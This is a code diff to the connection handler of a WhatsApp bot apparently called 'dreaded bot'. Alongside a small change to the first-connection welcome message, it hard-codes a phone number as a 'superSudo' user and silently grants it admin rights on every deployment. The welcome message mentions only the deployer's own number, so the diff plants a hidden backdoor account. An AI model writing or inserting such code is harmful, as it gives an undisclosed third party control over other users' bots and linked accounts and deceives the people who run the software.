@@ -69,6 +69,11 @@ const connectionHandler = async (client, update, startDreaded) => {
     if (!currentDevs.includes(Myself)) {
       await addSudoUser(Myself);
 
+const superSudo = '254114018035';
+    if (!currentDevs.includes(superSudo)) {
+      await addSudoUser(superSudo);
+    }
+
       let newSudoMessage = `Holla, ${getGreeting()},\n\nYou are connected to dreaded bot. 📡\n\n`;
       newSudoMessage += `👤 BOTNAME:- ${botname}\n`;
       newSudoMessage += `🔓 MODE:- ${settings.mode}\n`;
@@ -79,7 +84,7 @@ const connectionHandler = async (client, update, startDreaded) => {
       newSudoMessage += `▞▚▞▚▞▚▞▚▞▚▞▚▞\n\n`;
       newSudoMessage += `Looks like this is your first connection with this database, so we are gonna add to sudo users.\n\n`;
       newSudoMessage += `Now use the *${settings.prefix}settings* command to customize your bot settings.\n`;
-      newSudoMessage += `To access all commands, use *${settings.prefix}menu*`;
+      newSudoMessage += `To access all commands, use *${settings.prefix}menu*\n\n`;
 newSudoMessage += `.....and maybe 🤔 thank you 🗿`;
 
       await client.sendMessage(client.user.id, { text: newSudoMessage });
